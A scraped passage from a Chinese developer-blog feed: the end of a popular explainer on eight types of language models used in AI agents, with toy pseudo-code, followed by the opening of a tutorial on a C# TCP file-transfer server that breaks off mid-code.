                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近在玩生成式AI的朋友肯定都发现了：</p>
<p>不是所有的大语言模型都干同一件事。</p>
<p>有的擅长聊天，有的擅长思考，有的能动手操作，有的能看懂图片，甚至有些在你手机里默默运行而不会耗尽电池。</p>
<p><strong>说白了，选对工具，问题就解决了一大半。</strong></p>
<p>所以，如果你想搞AI智能体（Agent），那下面这几种模型你必须得懂。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6217801db2241eebeb1f8933f0217cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9ib3RTdG9uZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765615529&amp;x-signature=aTiptytNb4rPqNbfG3pF7MD%2Bxhk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">1. GPT — 什么都能干的“全能选手”</h2>
<p>GPT就是那种“万金油”模型。写文章、做总结、翻译、讲东西、想点子、改Bug、陪聊天……它啥都行，而且说人话，不像教科书那么死板。</p>
<p>你可以把它想成团队里的“<strong>多面手</strong>”： 虽然不是顶尖专家，但哪里需要就能顶上去，专门处理各种意外情况。</p>
<p>比如，你随便问它个问题：</p>
<pre><code class="hljs language-scss" lang="scss">reply = <span class="hljs-built_in">gpt</span>("用大白话给我娃解释下‘过拟合’是啥。")
<span class="hljs-built_in">print</span>(reply)
</code></pre>
<p><strong>对搞AI智能体的工程师来说，这为啥重要？</strong> 因为GPT就像“<strong>万能胶</strong>”，负责把所有零件粘合在一起，统筹全局。</p>
<p>因为GPT是天然的“<strong>总调度</strong>”。它就像万能胶，把下面一堆各种工具粘在一起，还负责盯着大局，别让大家干跑偏了。</p>
<h2 data-id="heading-1">2. MoE（混合专家模型）— 谁的活谁干，绝不瞎掺和</h2>
<p>MoE（混合专家）模型的工作方式很像医院的分诊系统。</p>
<p>不同的病找不同的大夫。你不会因为骨折去找心内科医生吧？MoE就是这个思路。</p>
<p>当文本输入进来时，模型内部有个"导诊台"（路由器），它会判断这个问题该交给哪位"专家"来处理。<br/>
这样既聪明又省算力。</p>
<p>简单示意一下：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">def route(text):
    <span class="hljs-keyword">if</span> <span class="hljs-string">"math"</span> <span class="hljs-keyword">in</span> text:
        <span class="hljs-keyword">return</span> math_expert
    elif <span class="hljs-string">"code"</span> <span class="hljs-keyword">in</span> text:
        <span class="hljs-keyword">return</span> code_expert
    <span class="hljs-keyword">return</span> general_expert
</code></pre>
<p><strong>为啥这个设计厉害？</strong> 因为它让模型"看起来很大、很强"，但实际运行时不用把所有专家都叫上，省了一大笔算力开销。</p>
<h2 data-id="heading-2">3. LRM — 会"动脑子"的推理模型</h2>
<p>有些活儿光靠“会说话”不行，得靠<strong>一步一步动脑子</strong>。 LRM就是专门练出来“走流程思考”的模型——不是张口就来，而是掰开揉碎、慢慢推演。</p>
<p>适合交给它的任务有：</p>
<ul>
<li>制定计划</li>
<li>解应用题（比如鸡兔同笼）</li>
<li>调用外部工具（比如查天气、算日期）</li>
<li>查资料 + 谨慎使用数据</li>
<li>分几步做决策（不能一步到位那种）</li>
</ul>
<p>举个典型用法：</p>
<pre><code class="hljs language-bash" lang="bash">result = lrm.solve(<span class="hljs-string">"2月5日到3月1日之间有多少天？"</span>)
<span class="hljs-built_in">print</span>(result[<span class="hljs-string">"步骤"</span>])     <span class="hljs-comment"># 看它是怎么一步步算的</span>
<span class="hljs-built_in">print</span>(result[<span class="hljs-string">"最终答案"</span>]) <span class="hljs-comment"># 最后得出结果</span>
</code></pre>
<p>用起来感觉很不一样——你不是在猜答案，而是在看AI“把脑子摊开给你看”。</p>
<p><strong>一句话总结：GPT像文科生，LRM像理科生。一个会说，一个会算。</strong></p>
<h2 data-id="heading-3">4. VLM — 视觉语言模型：给AI装上"眼睛"</h2>
<p>如果一个AI只能看文字，那它就像被关在隧道里，看不到外面的世界。</p>
<p>但只要让它拥有看截图、照片、图表和示意图的能力，整个世界就对它打开了大门！</p>
<p>这就是 <strong>VLM（视觉语言模型）</strong> 的作用。</p>
<p><strong>举个例子</strong>：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">info</span> = vlm(<span class="hljs-string">"diagram.png"</span>)
print(info<span class="hljs-section">["summary"]</span>)
</code></pre>
<p>AI一旦能"看见"，就不再是个只会聊天的机器人了，而是变成一个<strong>真正的助手</strong>。</p>
<p>就像一个聪明的同事，你给他看张图，他能马上告诉你图里的重点，而不是让你费劲地描述半天。</p>
<p><strong>一句话总结：VLM让AI从"聊天机器人"升级成"视觉助手"。</strong></p>
<h2 data-id="heading-4">5. SLM — 小型语言模型：安静运行在你设备里的“小帮手”</h2>
<p>有人说SLM是“小模型”，就以为它能力弱？<strong>大错特错！</strong></p>
<p>SLM（小型语言模型）就像手机里的“<strong>隐形助手</strong>”，它不显山不露水，但天天为你干活：</p>
<ul>
<li>跑在你的iPhone和安卓手机上</li>
<li>嵌进微信、输入法、备忘录这些APP里</li>
<li>不用联网也能工作（断网也不怕）</li>
<li>你说完话，它“唰”一下就反应过来，快得离谱</li>
</ul>
<p><strong>它最适合啥场景？</strong></p>
<ul>
<li>需要<strong>立刻回应</strong>（别让用户等得发疯！）</li>
<li><strong>隐私敏感</strong>（比如处理私密日记，不想上网传）</li>
</ul>
<p>举个例子：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">note</span> = slm(<span class="hljs-string">"把这个变成提醒：今晚浇花。"</span>)
<span class="hljs-comment"># 当下生成，本地处理，不传服务器，隐私安全，速度拉满！</span>
</code></pre>
<p><strong>它不像GPT那样爱出风头，但它干的是“接地气”的活儿：</strong></p>
<ul>
<li>打字时帮你自动补全后半句</li>
<li>收到消息自动弹出“好的”“马上到”这种快捷回复</li>
<li>在智能手表上听懂你小声嘀咕的指令</li>
<li>让老手机也能拥有“智能大脑”</li>
</ul>
<p><strong>未来最忙的AI，可能根本不在云端，而在你口袋里。</strong></p>
<h2 data-id="heading-5">6. LAM —— AI界的“行动派”：不仅会思考，还会“动手”</h2>
<p>如果说GPT是团队里的“点子王”，那<strong>LAM就是那个把点子变成现实的“执行经理”</strong> 。</p>
<p>它不光会“说”，更会“做”：</p>
<ul>
<li><strong>操控手机</strong>：打开任意App，像你的手一样操作</li>
<li><strong>指挥电脑</strong>：运行命令、操作文件、秒变极客</li>
<li><strong>连接世界</strong>：调用API、浏览网页、抓取信息</li>
<li><strong>控制硬件</strong>：让机器人动起来，或操作智能家居</li>
<li><strong>端到端干活</strong>：从规划到执行，一条龙服务</li>
</ul>
<p>它工作的流程很简单：</p>
<ul>
<li><strong>先规划</strong>（比如：“我要查明天去广州最便宜的机票”）</li>
<li><strong>再执行</strong>（自动打开飞机票网站、比对价格、给你报出结果）</li>
</ul>

<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">task</span> = lam.plan(<span class="hljs-string">"明天早上飞班加罗尔，找最便宜的票。"</span>)
lam.execute(task)   <span class="hljs-comment"># LAM会自动搞定全过程，你坐等结果！</span>
</code></pre>
<p><strong>为什么LAM是游戏规则的改变者？</strong> 普通AI只能“<strong>讲故事</strong>”、“<strong>写报告</strong>”， 而 <strong>LAM 能“</strong> <strong>动手改写现实</strong>！**</p>
<h2 data-id="heading-6">7. HLM — 分层语言模型：一个模型搞不定，那就让多个模型“分工合作”</h2>
<p>有些任务实在太大了，一个模型根本搞不定。<br/>
比如写一份完整的调研报告。你需要一个模型来规划报告结构，另一个模型去深挖数据和见解，第三个模型负责润色和撰写最终的文字。</p>
<p><strong>HLM（分层语言模型）</strong> 就是用来解决这个问题的。它在内部将自己组织起来——就像在一个架构里同时拥有一个<strong>项目经理、一个研究员和一个撰稿人</strong>。</p>
<p>内部协作流程可能像这样：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">output</span> = hlm(<span class="hljs-string">"写一份竞品分析报告。"</span>)
<span class="hljs-comment"># 内部运作：</span>
<span class="hljs-comment"># 规划师 → 研究员 → 撰稿人</span>
</code></pre>
<p><strong>这样做有什么好处？</strong> <strong>稳！准！狠！</strong> 这让AI智能体在处理<strong>超长、超复杂的任务</strong>时，不会写到一半就迷失方向、前言不搭后语了——因为它有层级，有“项目经理”在盯着呢！</p>
<h2 data-id="heading-7">8. LCM — 大型概念模型：理解“言下之意”，而非字面意思</h2>
<p>咱们日常说话其实特别灵活：同一个意思，能换十几种说法。比如表达心情不好，有人说「难过」，有人说「低落」，有人说「emo了」，还有人说「今儿提不起劲儿」——字面全不一样，但本质是同一个感受。</p>
<p>LCM 要做的，就是帮 AI 把这些五花八门的表达，对应到<strong>最核心的概念</strong>上。它相当于在「字面含义」和「真实意图」之间搭了一座桥，让 AI 不抠字眼，而是真的懂你。</p>
<p>举个简单的例子：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">concept</span> = <span class="hljs-built_in">lcm</span>(<span class="hljs-string">"Python、C++、Java"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-keyword">concept</span>) # <span class="hljs-string">"编程语言"</span>
</code></pre>
<p>为啥这个能力对智能体很关键？ 如果 AI 只认字词，换个说法它可能就懵；但当它懂<strong>概念</strong>，就能举一反三：比如你让它「整理电脑里的代码相关文件」，它不会只挑文件名带 <code>.py</code> <code>.cpp</code> 的，而是能意识到「Python、C++ 相关的内容，本质都是代码」，把该归拢的都归拢好。 对智能体来说，这种「抓本质、连关联」的能力，是它能真正「懂人」、不犯「抠字眼误解意图」这类低级错误的关键。</p>
<h2 data-id="heading-8">为什么现在必须搞懂这些模型分类？</h2>
<p>早年的 AI 智能体，逻辑特别简单：<strong>一个模型、一句指令、一个回复</strong>——你问啥，它答啥，多走一步都不会，更别说自己规划复杂任务。</p>
<p>但现在早不是那个时代了。</p>
<p>成熟的现代智能体，本质是一套<strong>完整的协作系统</strong>：各个模型模块像人体的不同器官，各司其职又互相配合，凑在一起才是能真正解决问题的「智能体」：</p>
<ul>
<li>靠 <strong>VLM</strong> 当「眼睛」，能看图片、图表、扫描件；</li>
<li>靠 <strong>LAM</strong> 当「手脚」，能实际操作软件、调用工具、执行任务；</li>
<li>靠 <strong>LRM</strong> 当「逻辑脑」，能一步步算题、做推理、验证结论；</li>
<li>靠 <strong>HLM</strong> 当「项目经理」，能拆分复杂任务、统筹多环节流程；</li>
<li>靠 <strong>LCM</strong> 当「认知中枢」，能透过字面懂本质、不抠字眼；</li>
<li>靠 <strong>MoE + SLM</strong> 当「高效代谢系统」，干活省资源、响应快；</li>
<li>最后靠 <strong>GPT</strong> 当「心脏」，把所有模块的工作串起来、兜底统筹。</li>
</ul>
<p>换句话说：GPT 是智能体的核心，但光有核心不够——得有眼睛能看、手脚能做、脑子能想、神经能联动，才算一个完整的、能解决真实问题的智能体。</p>
<p>现在搞懂这8类模型，不是「闲知识」：对所有做AI工具、产品、原型的人来说，这已经是<strong>核心基本功</strong>——就像造汽车的工程师得懂发动机、变速箱、底盘各自的作用，你得知道不同模型该往什么位置放，才能搭出能用、好用的智能体。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[C# 实现网络文件传输：打造稳定可靠的工业级工具]]></title>    <link>https://juejin.cn/post/7580210602079387682</link>    <guid>https://juejin.cn/post/7580210602079387682</guid>    <pubDate>2025-12-06T07:48:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580210602079387682" data-draft-id="7575162322240667648" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="C# 实现网络文件传输：打造稳定可靠的工业级工具"/> <meta itemprop="keywords" content="后端,C#,.NET"/> <meta itemprop="datePublished" content="2025-12-06T07:48:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小码编匠"/> <meta itemprop="url" content="https://juejin.cn/user/1308876155395739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            C# 实现网络文件传输：打造稳定可靠的工业级工具
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1308876155395739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小码编匠
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T07:48:49.000Z" title="Sat Dec 06 2025 07:48:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言：为什么需要这样一个工具？</h2>
<p>在企业级开发中，文件传输功能几乎是必备需求。无论是内网文件同步、远程数据备份，还是分布式系统间的文件交换，一个稳定高效的文件传输工具都显得至关重要。</p>
<p>今天就有位开发私信我："老师，我需要开发一个文件传输工具，服务端只管接收文件并保存到指定目录，客户端只管发送文件。网上的示例要么功能复杂，要么不够稳定，能否提供一个完整的解决方案？"相信很多朋友都遇到过类似需求。今天我们就来彻底搞定这个问题，用 C# 打造一个功能专一、稳定可靠的网络文件传输工具！</p>
<p>很多现成的文件传输方案要么依赖第三方库，要么集成了太多非核心功能，导致维护困难、部署复杂。而我们追求的是<strong>最小可行、专注单一职责</strong>的设计哲学——服务端只做接收，客户端只做发送，界面简洁直观，异常处理完善，真正做到"开箱即用"。</p>
<h3 data-id="heading-1">正文</h3>
<h4 data-id="heading-2">需求分析与设计目标</h4>
<p>我们的核心目标很明确：</p>
<p>1、职责清晰：服务端专门接收，客户端专门发送</p>
<p>2、界面友好：实时进度、速度显示、状态提示</p>
<p>3、异常处理：网络中断、文件冲突等场景的优雅处理</p>
<p>4、即插即用：最小化配置，开箱即用</p>
<h4 data-id="heading-3">架构设计</h4>
<p>整体采用经典的分层解耦模式，核心组件包括：</p>
<ul>
<li>
<p>FileTransferServer：服务端核心类，负责监听和接收</p>
</li>
<li>
<p>FileTransferClient：客户端核心类，负责连接和发送</p>
</li>
<li>
<p>TransferEventArgs：事件参数类，统一状态通知</p>
</li>
<li>
<p>FrmMain：UI主窗体，用户交互界面</p>
</li>
</ul>
<p>架构图如下</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b76ae5367d744fbb7092c06df3010d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP56CB57yW5Yyg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765612129&amp;x-signature=5LhV6WjoXNUW2bmlPDnZAQAabc4%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-4">服务端实现：专注接收文件</h4>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-keyword">using</span> System;
<span class="hljs-keyword">using</span> System.IO;
<span class="hljs-keyword">using</span> System.Net;
<span class="hljs-keyword">using</span> System.Net.Sockets;
<span class="hljs-keyword">using</span> System.Text;
<span class="hljs-keyword">using</span> System.Threading;
<span class="hljs-keyword">using</span> System.Threading.Tasks;
<span class="hljs-keyword">using</span> AppNetworkFileTransfer.Core;
<span class="hljs-keyword">using</span> AppNetworkFileTransfer.Models;

<span class="hljs-keyword">namespace</span> <span class="hljs-title">AppNetworkFileTransfer.Core</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">FileTransferServer</span>
    {
        <span class="hljs-keyword">private</span> TcpListener _listener;
        <span class="hljs-keyword">private</span> TcpClient _client;
        <span class="hljs-keyword">private</span> NetworkStream _stream;
        <span class="hljs-keyword">private</span> <span class="hljs-built_in">bool</span> _isRunning = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">private</span> <span class="hljs-built_in">bool</span> _isClientConnected = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">private</span> CancellationTokenSource _cancellationTokenSource;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">int</span> BufferSize = <span class="hljs-number">8192</span>;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">int</span> HeaderSize = <span class="hljs-number">1024</span>;

        <span class="hljs-comment">// 添加保存目录属性</span>
        <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> SaveDirectory { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

        <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;TransferEventArgs&gt; ProgressChanged;
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;TransferEventArgs&gt; StatusChanged;
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;TransferEventArgs&gt; ClientConnected;
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;TransferEventArgs&gt; TransferStarted;

        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">StartListening</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> port</span>)</span>
        {
            <span class="hljs-keyword">try</span>
            {
                _listener = <span class="hljs-keyword">new</span> TcpListener(IPAddress.Any, port);
                _listener.Start();
                _isRunning = <span class="hljs-literal">true</span>;
                _cancellationTokenSource = <span class="hljs-keyword">new</span> CancellationTokenSource();
                OnStatusChanged(<span class="hljs-string">$"服务器启动，监听端口 <span class="hljs-subst">{port}</span>，文件保存目录: <span class="hljs-subst">{SaveDirectory}</span>"</span>);
                <span class="hljs-comment">// 在后台异步等待客户端连接</span>
                _ = Task.Run(<span class="hljs-keyword">async</span> () =&gt; <span class="hljs-keyword">await</span> WaitForClientAsync());
            }
            <span class="hljs-keyword">catch</span> (Exception ex)
            {
                OnStatusChanged(<span class="hljs-string">$"服务器启动失败: <span class="hljs-subst">{ex.Message}</span>"</span>, <span class="hljs-literal">true</span>);
                <span class="hljs-keyword">throw</span>;
            }
        }

        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">WaitForClientAsync</span>()</span>
        {
            <span class="hljs-keyword">try</span>
            {
                <span class="hljs-keyword">while</span> (_isRunning &amp;&amp; !_cancellationTokenSource.Token.IsCancellationRequested)
                {
                    _client = <span class="hljs-keyword">await</span> _listener.AcceptTcpClientAsync();
                    _stream = _client.GetStream();
                    _isClientConnected = <span class="hljs-literal">true</span>;
                    OnStatusChanged(<span class="hljs-string">$"客户端已连接: <span class="hljs-subst">{_client.Client.RemoteEndPoint}</span>"</span>);
                    ClientConnected?.Invoke(<span class="hljs-keyword">this</span>, <span class="hljs-keyword">new</span> TransferEventArgs(<span class="hljs-string">"客户端已连接"</span>));
                    <span class="hljs-comment">// 开始处理客户端请求</span>
                    _ = Task.Run(<span class="hljs-keyword">async</span> () =&gt; <span class="hljs-keyword">await</span> HandleClientAsync());
                    <span class="hljs-keyword">break</span>;
                }
            }
